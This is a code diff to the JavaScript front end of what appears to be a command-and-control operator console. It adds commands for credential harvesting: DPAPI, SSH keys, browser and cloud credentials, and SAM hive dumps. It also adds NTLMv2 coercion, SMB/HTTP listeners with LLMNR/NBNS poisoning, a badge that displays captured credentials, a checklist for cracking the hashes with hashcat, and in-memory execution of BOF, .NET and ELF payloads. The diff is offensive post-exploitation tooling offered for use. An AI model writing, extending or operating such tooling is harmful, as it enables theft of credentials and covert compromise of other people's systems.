@@ -18,6 +18,7 @@ const Sessions = (() => {
   const _localCmdIds     = new Set();  // server cmd_ids promoted by THIS browser
   const _noResponseIds   = new Set();  // cmd_ids for fire-and-forget (KILL/EXIT) — suppress pending bar
   const _deletingUploads = new Map();  // cmd_id → {remote_path, rowEl}
+  const _listenActive    = {};         // session_id → { listeners: {key→{proto,port,started_at,creds}}, _dirty }  (live badge state)
   let   _exfilShowPath   = false;
   let _suggestItems = [];
   let _suggestIdx   = -1;
@@ -61,6 +62,17 @@ const Sessions = (() => {
     { cmd: '/upload',    hint: '[remote_dest]',              desc: 'Upload local file to agent' },
     { cmd: '/timestomp', hint: '<target> <ref>',            desc: 'Copy timestamps target←ref',       req: 2 },
     { cmd: '/persist',   hint: 'probe|install <id>|remove <id>|status <id>|check',  desc: 'Persistence engine', req: 1, opts: ['probe', 'install', 'remove', 'status', 'check'] },
+    { cmd: '/creds',     hint: 'harvest|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', desc: 'Credential harvesting', req: 1, opts: [
+      { name: 'harvest',      desc: 'Collect DPAPI, SSH keys, browser DBs, cloud creds' },
+      { name: 'coerce',       desc: 'Force local auth to capture NTLMv2 / SSH agent' },
+      { name: 'sam',          desc: 'Dump SAM/SYSTEM/SECURITY hives (Win, SYSTEM req)' },
+      { name: 'listen start', desc: 'Start listener — smb:445, http:80, smb:8445, etc.' },
+      { name: 'listen stop',  desc: 'Stop all listeners, or specific: listen stop http:80' },
+      { name: 'listen dump',  desc: 'Captured NTLMv2 hashes + Basic creds + poisoner stats' },
+    ] },
+    { cmd: '/bof',       hint: '<file.obj> [args]',         desc: 'Execute BOF/COFF in-memory (Win)' },
+    { cmd: '/assembly',  hint: '<file.exe> [args]',         desc: 'Execute .NET assembly in-memory (Win)' },
+    { cmd: '/memexec',   hint: '<file.elf> [args]',         desc: 'Execute ELF in-memory via memfd (Linux)' },
     { cmd: '/kill',      hint: '',                          desc: 'Wipe agent + terminate' },
     { cmd: '/stop',      hint: '',                          desc: 'Stop agent, files remain' },
     { cmd: '/history',   hint: '',                          desc: 'Switch to History tab' },
@@ -192,8 +204,14 @@ const Sessions = (() => {
         const partial = (parts[parts.length - 1] || '').toLowerCase();
         const isTypingOpt = parts.length > 1;
         const filter = isTypingOpt ? partial : '';
-        const matches = def.opts.filter(o => o.startsWith(filter));
-        _suggestShowItems(matches.map(o => ({ label: o, hint: '', desc: '', fill: `${cmdName} ${o}` })));
+        const isObj = def.opts.length && typeof def.opts[0] === 'object';
+        const matches = isObj
+          ? def.opts.filter(o => o.name.startsWith(filter))
+          : def.opts.filter(o => o.startsWith(filter));
+        _suggestShowItems(matches.map(o => isObj
+          ? ({ label: o.name, hint: '', desc: o.desc, fill: `${cmdName} ${o.name}` })
+          : ({ label: o, hint: '', desc: '', fill: `${cmdName} ${o}` })
+        ));
       } else if (def.hint) {
         _suggestShowHint(def);
       } else {
@@ -451,6 +469,81 @@ const Sessions = (() => {
     btn.title        = stopped ? 'Resume Dropbox polling' : 'Stop Dropbox polling for this session';
   }
 
+  /* ── Listen badge (passive SMB listener indicator) ─────────────────────── */
+  function _getListeners(sid) {
+    // Merge persistent (from server session data) + live (from _listenActive)
+    const sess = sid ? _sessions[sid] : null;
+    const persistent = sess?.listeners || {};
+    const live = _listenActive[sid]?.listeners || {};
+    // Live overrides persistent (more recent creds count)
+    const merged = { ...persistent, ...live };
+    return Object.keys(merged).length ? merged : null;
+  }
+
+  function _updateListenBadge() {
+    const badge = $('#listen-badge');
+    if (!badge) return;
+    const listeners = _activeId ? _getListeners(_activeId) : null;
+    if (listeners && Object.keys(listeners).length) {
+      badge.style.display = 'inline-flex';
+      const keys = Object.keys(listeners);
+      const count = keys.length;
+      // Summary label
+      const labelEl = badge.querySelector('.listen-badge-label');
+      if (labelEl) labelEl.textContent = count === 1 ? keys[0].toUpperCase() : `${count} listeners`;
+
+      // Build detailed tooltip
+      let tip = `⚠ ${count} active listener${count > 1 ? 's' : ''} + LLMNR/NBNS poisoner\n\n`;
+      for (const [key, info] of Object.entries(listeners)) {
+        const since = info.started_at ? new Date(info.started_at).toLocaleString() : '?';
+        const credsN = (info.creds || []).length;
+        tip += `  ${key.toUpperCase()} — started ${since} — ${credsN} cred${credsN !== 1 ? 's' : ''}\n`;
+      }
+      tip += `\nOperator checklist:\n`;
+      tip += `  1. /creds listen dump → retrieve captured hashes\n`;
+      tip += `  2. /creds listen stop → stop all (or stop <proto:port>)\n`;
+      tip += `  3. hashcat -m 5600 to crack NTLMv2`;
+      badge.title = tip;
+
+      // Expandable memo
+      let memo = badge.querySelector('.listen-badge-memo');
+      if (!memo) {
+        memo = document.createElement('span');
+        memo.className = 'listen-badge-memo';
+        badge.appendChild(memo);
+      }
+      let memoHtml = '';
+      for (const [key, info] of Object.entries(listeners)) {
+        const since = info.started_at ? new Date(info.started_at).toLocaleString() : '?';
+        const creds = info.creds || [];
+        memoHtml += `<div class="listen-entry"><b>${escHtml(key.toUpperCase())}</b> · since ${escHtml(since)} · ${creds.length} cred${creds.length !== 1 ? 's' : ''}`;
+        if (creds.length > 0) {
+          memoHtml += `<ul class="listen-creds">`;
+          for (const c of creds.slice(-10)) {
+            memoHtml += `<li>${escHtml(c)}</li>`;
+          }
+          if (creds.length > 10) memoHtml += `<li>… and ${creds.length - 10} more</li>`;
+          memoHtml += `</ul>`;
+        }
+        memoHtml += `</div>`;
+      }
+      memo.innerHTML = memoHtml;
+    } else {
+      badge.style.display = 'none';
+      badge.removeAttribute('data-expanded');
+    }
+  }
+
+  function _listenBadgeToggleExpand() {
+    const badge = $('#listen-badge');
+    if (!badge) return;
+    if (badge.hasAttribute('data-expanded')) {
+      badge.removeAttribute('data-expanded');
+    } else {
+      badge.setAttribute('data-expanded', '');
+    }
+  }
+
   function _renderDetail() {
     const s = _sessions[_activeId];
     if (!s) return;
@@ -470,6 +563,7 @@ const Sessions = (() => {
     if (pillTxt) pillTxt.textContent = st;
 
     _updatePollBtn(s.polling_stopped);
+    _updateListenBadge();
 
     const promptEl = $('#shell-prompt');
     if (promptEl) promptEl.textContent = _prompt(s.target_os, s.agent_process, s.target_privs);
@@ -808,6 +902,21 @@ const Sessions = (() => {
           '  /persist remove <id>               Remove a persistence technique by ID',
           '  /persist status <id>               Check status of a specific technique',
           '  Use the Persist tab for a visual overview with one-click install / remove.',
+          '',
+          '🔑  CREDENTIAL HARVESTING',
+          '  ───────────────────────────────────────────────────────────────────',
+          '  /creds harvest                     Collect credential files (DPAPI, SSH keys, browser DBs, etc.)',
+          '  /creds coerce                      Force local auth to capture hashes (Win: pipe, Linux: SSH agent)',
+          '  /creds sam                         Dump SAM/SYSTEM/SECURITY hives (Windows, requires SYSTEM)',
+          '  /creds listen start <proto:port>   Start NTLMv2 listener + LLMNR/NBNS poisoners',
+          '    /creds listen start smb:445       — SMB listener (default)',
+          '    /creds listen start smb:8445      — SMB on custom port (Windows-friendly)',
+          '    /creds listen start http:80       — HTTP NTLM (browser-triggerable)',
+          '    /creds listen start http:8080     — HTTP NTLM on custom port',
+          '    Multiple listeners can run simultaneously.',
+          '  /creds listen stop                 Stop ALL listeners + poisoners',
+          '  /creds listen stop http:80         Stop a specific listener',
+          '  /creds listen dump                 Retrieve captured credentials + poisoner stats',
         ].join('\n'));
         break;
       }
@@ -929,6 +1038,105 @@ const Sessions = (() => {
         } else {
           _setOutput(cmdId, 'Usage: /persist probe|install <id>|remove <id>|status <id>|check', true);
         }
+        break;
+      }
+
+      case '/creds': {
+        if (!args.length) { _setOutput(cmdId, 'Usage: /creds harvest|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', true); break; }
+        const sub = args[0];
+        let cd, crid;
+        if (sub === 'harvest') {
+          cd = _checkCmd(await API.sendCommand(id, 'CREDS_HARVEST', '/creds harvest'));
+          crid = _promoteId(cd);
+          _setQueued(crid, '/creds harvest queued — collecting credentials');
+        } else if (sub === 'coerce') {
+          cd = _checkCmd(await API.sendCommand(id, 'CREDS_COERCE', '/creds coerce'));
+          crid = _promoteId(cd);
+          _setQueued(crid, '/creds coerce queued');
+        } else if (sub === 'sam') {
+          cd = _checkCmd(await API.sendCommand(id, 'CREDS_SAM', '/creds sam'));
+          crid = _promoteId(cd);
+          _setQueued(crid, '/creds sam queued — dumping SAM/SYSTEM/SECURITY');
+        } else if (sub === 'listen') {
+          const listenSub = args[1] || '';
+          if (listenSub === 'start') {
+            const spec = args[2] || 'smb:445';
+            // Parse proto:port — accept "http:80", "smb:8445", or bare port "8445" (defaults to smb)
+            let proto, port;
+            if (spec.includes(':')) {
+              [proto, port] = spec.split(':');
+              proto = proto.toLowerCase();
+              if (!['smb', 'http'].includes(proto)) {
+                _setOutput(cmdId, `Unknown protocol "${proto}". Use smb or http.\n  Examples: /creds listen start http:80  |  /creds listen start smb:8445`, true);
+                break;
+              }
+            } else {
+              proto = 'smb';
+              port = spec;
+            }
+            if (!/^\d+$/.test(port) || +port < 1 || +port > 65535) {
+              _setOutput(cmdId, `Invalid port "${port}". Use 1–65535.\n  Examples: /creds listen start http:80  |  /creds listen start smb:8445`, true);
+              break;
+            }
+            // Warn on Windows + smb:445
+            const sessOs = (_sessions[_activeId]?.target_os || '').toLowerCase();
+            if (sessOs.includes('windows') && proto === 'smb' && port === '445') {
+              const proceed = await confirm('Port 445 Blocked on Windows',
+                'Port 445 is occupied by the native LanmanServer service on Windows — the SMB listener will fail to bind.\n\n'
+                + 'Try one of these instead:\n'
+                + '  /creds listen start smb:8445   — SMB on alternate port\n'
+                + '  /creds listen start http:80    — HTTP NTLM (works in browsers)\n\n'
+                + 'Continue with smb:445 anyway?');
+              if (!proceed) { _setOutput(cmdId, 'Aborted — try /creds listen start http:80 or smb:8445'); break; }
+            }
+            cd = _checkCmd(await API.sendCommand(id, `CREDS_LISTEN_START:${proto}:${port}`, `/creds listen start ${proto}:${port}`));
+            crid = _promoteId(cd);
+            _setQueued(crid, `/creds listen start ${proto}:${port} queued`);
+          } else if (listenSub === 'stop') {
+            const stopSpec = args[2] || '';
+            const stopCmd = stopSpec ? `CREDS_LISTEN_STOP:${stopSpec}` : 'CREDS_LISTEN_STOP';
+            const stopLabel = stopSpec ? `/creds listen stop ${stopSpec}` : '/creds listen stop';
+            cd = _checkCmd(await API.sendCommand(id, stopCmd, stopLabel));
+            crid = _promoteId(cd);
+            _setQueued(crid, `${stopLabel} queued`);
+          } else if (listenSub === 'dump') {
+            cd = _checkCmd(await API.sendCommand(id, 'CREDS_LISTEN_DUMP', '/creds listen dump'));
+            crid = _promoteId(cd);
+            _setQueued(crid, '/creds listen dump queued');
+          } else {
+            _setOutput(cmdId, 'Usage: /creds listen start <proto:port>|stop [proto:port]|dump\n  Examples: /creds listen start http:80  |  /creds listen stop http:80', true);
+          }
+        } else {
+          _setOutput(cmdId, 'Usage: /creds harvest|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', true);
+        }
+        break;
+      }
+
+      case '/bof':
+      case '/assembly':
+      case '/memexec': {
+        const typeMap = { '/bof': 'bof', '/assembly': 'assembly', '/memexec': 'memexec' };
+        const execType = typeMap[slash];
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.style.display = 'none';
+        document.body.appendChild(fileInput);
+        const argsStr = args.join(' ');
+        fileInput.onchange = async () => {
+          const f = fileInput.files[0];
+          document.body.removeChild(fileInput);
+          if (!f) { _setOutput(cmdId, 'No file selected.', true); return; }
+          _setOutput(cmdId, `Staging ${f.name} (${(f.size/1024).toFixed(1)} KB)...`);
+          try {
+            const d = await API.execInline(id, execType, f, argsStr);
+            const rid = d?.command?.cmd_id || cmdId;
+            if (d?.command?.cmd_id) _promoteIdManual(cmdId, d.command.cmd_id);
+            _setQueued(rid, `${slash} ${f.name} ${argsStr} — executing in-memory`);
+          } catch (e) {
+            _setOutput(cmdId, `Error: ${e.message || e}`, true);
+          }
+        };
+        fileInput.click();
         break;
       }
 
@@ -2517,6 +2725,59 @@ const Sessions = (() => {
     // Live-update History tab when a command completes for the active session
     const _histSid = session_id || _activeId;
     if (_histSid === _activeId && $('#tp-history.on')) _renderHistory();
+
+    // ── Listen badge: detect listener start/stop/dump from agent response ──
+    if (content && content.includes('[creds listen]')) {
+      const sid = session_id || _activeId;
+      if (sid) {
+        if (!_listenActive[sid]) _listenActive[sid] = { listeners: {} };
+        const la = _listenActive[sid].listeners;
+
+        if (content.includes('Active:')) {
+          // "[creds listen] Active: HTTP-NTLM:80 + LLMNR + NBNS"
+          const m = content.match(/Active:\s*(.+?)(?:\n|$)/);
+          if (m) {
+            const parts = m[1].split('+').map(p => p.trim());
+            const now = new Date().toISOString();
+            for (const part of parts) {
+              const pm = part.match(/^(SMB|HTTP-NTLM|HTTP):(\d+)$/i);
+              if (pm) {
+                const proto = pm[1].toLowerCase().includes('http') ? 'http' : 'smb';
+                const port = parseInt(pm[2]);
+                const key = `${proto}:${port}`;
+                if (!la[key]) la[key] = { proto, port, started_at: now, creds: [] };
+              }
+            }
+          }
+        } else if (content.includes('Stopped') && content.includes('listener(s)')) {
+          // Stop all
+          _listenActive[sid].listeners = {};
+        } else if (content.includes('Stopped') && !content.includes('listener(s)')) {
+          // Stop specific: "Stopped http:80."
+          const m = content.match(/Stopped\s+([\w]+:\d+)/);
+          if (m) delete la[m[1]];
+        } else {
+          // Dump: parse per-listener credential lines
+          let currentKey = null;
+          for (const line of content.split('\n')) {
+            const hdr = line.match(/^\[([\w-]+):(\d+)\]\s+(\d+)\s+credential/i);
+            if (hdr) {
+              const proto = hdr[1].toLowerCase().includes('http') ? 'http' : 'smb';
+              const port = parseInt(hdr[2]);
+              currentKey = `${proto}:${port}`;
+              if (!la[currentKey]) la[currentKey] = { proto, port, started_at: new Date().toISOString(), creds: [] };
+              continue;
+            }
+            if (currentKey && line.startsWith('  ') && line.trim()) {
+              const cred = line.trim();
+              const entry = la[currentKey];
+              if (entry && !entry.creds.includes(cred)) entry.creds.push(cred);
+            }
+          }
+        }
+        if (sid === _activeId) _updateListenBadge();
+      }
+    }
   }
 
   function onHeartbeat(session_id, state) {
@@ -2828,6 +3089,11 @@ const Sessions = (() => {
           pollBtn.disabled = false;
         }
       });
+    }
+
+    const listenBadge = $('#listen-badge');
+    if (listenBadge) {
+      listenBadge.addEventListener('click', _listenBadgeToggleExpand);
     }
 
     _startHbTicker();
